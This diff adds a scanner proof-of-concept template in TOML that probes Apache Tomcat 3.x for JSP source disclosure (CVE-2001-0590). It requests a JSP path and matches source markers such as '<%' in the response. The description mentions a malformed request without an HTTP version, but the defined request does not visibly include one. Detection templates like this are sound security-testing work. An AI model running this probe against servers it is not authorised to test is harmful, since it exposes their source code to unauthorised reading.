@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "Apache Tomcat Servlet 3.2.2 之前版本存在 JSP 源码泄露漏洞，发送不带 HTTP 协议版本的畸形 GET 请求可读取 JSP 源码而非执行结果。"
+id = "POC-AVE-2001-0250"
+name = "Apache Tomcat 3.x JSP 源码泄露 PoC"
+severity = "medium"
+tags = ["ave-2001-0250"]
+vuln_id = [
+    "CVE-2001-0590",
+    "AVE-2001-0250",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{JspPath}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%",
+    "<%@",
+    "java",
+    "jsp:",
+]
+
+[[poc.requests.matchers]]
+expect = true
+part = "header"
+status = [200]
+type = "status"
